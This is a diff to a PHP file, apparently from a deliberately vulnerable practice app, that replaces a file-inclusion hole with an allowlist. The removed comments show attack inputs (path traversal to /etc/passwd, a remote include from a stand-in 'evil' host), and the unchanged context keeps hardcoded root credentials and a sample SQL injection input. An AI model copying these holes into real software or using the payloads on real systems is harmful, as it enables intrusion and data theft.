@@ -4,10 +4,20 @@
 // Hardcoded DB credentials committed to source control
 $conn = mysqli_connect("db.internal", "root", "root123", "app");
 
-// VULN 1: Local/Remote File Inclusion — user input passed to include().
-// ?page=../../../../etc/passwd  or  ?page=http://evil/shell.txt
-$page = $_GET['page'];
-include($page);
+// Only a fixed set of known-safe pages may be included. User input is used
+// solely as a key into this allowlist, never as a path passed to include().
+$ALLOWED_PAGES = array(
+    'home'      => 'pages/home.php',
+    'about'     => 'pages/about.php',
+    'dashboard' => 'pages/dashboard.php',
+);
+
+$page = isset($_GET['page']) ? (string) $_GET['page'] : 'home';
+if (!isset($ALLOWED_PAGES[$page])) {
+    http_response_code(400);
+    exit('Unknown page.');
+}
+include(__DIR__ . '/' . $ALLOWED_PAGES[$page]);
 
 // VULN 2: SQL Injection — request value concatenated into the query.
 // ?id=1 OR 1=1 --
